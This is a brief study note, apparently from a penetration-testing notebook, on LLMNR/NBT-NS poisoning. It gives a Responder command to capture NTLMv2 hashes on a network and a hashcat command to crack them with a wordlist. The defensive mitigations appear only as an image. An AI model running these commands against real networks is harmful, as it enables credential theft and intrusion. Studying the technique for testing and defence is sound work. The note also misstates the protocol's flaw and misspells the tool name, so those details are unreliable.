- - -
### What is LLMNR ? 

☐ <mark class="hltr-yellow">LLMNR</mark> = <mark class="hltr-grey">Link Local Multicase Name Resolution</mark>.

☐ It is used to Identify Hosts when DNS Failed to do so.

☐ Previously known as NBT-NS = Netbios Name Service.

☐ The key-flaw here is that when we request to this service then it acctually reponds back with **User:Hash** (NTLMv2). 

![Imgur](https://i.imgur.com/zldMgYK.png)
<br>

- - -
##  Attacking Steps : 

```python
python Respender.py -I tun0 -rdw -v 
```

Now Wait for someone to access you, Copy the Hash
```sh
hashcat -m 5600 hashes.txt /opt/rockyou.txt 
```
<br>

- - -
## Mitigations ( Defense ) : 

![Imgur](https://i.imgur.com/eJbOEZv.png)
<br>

- - -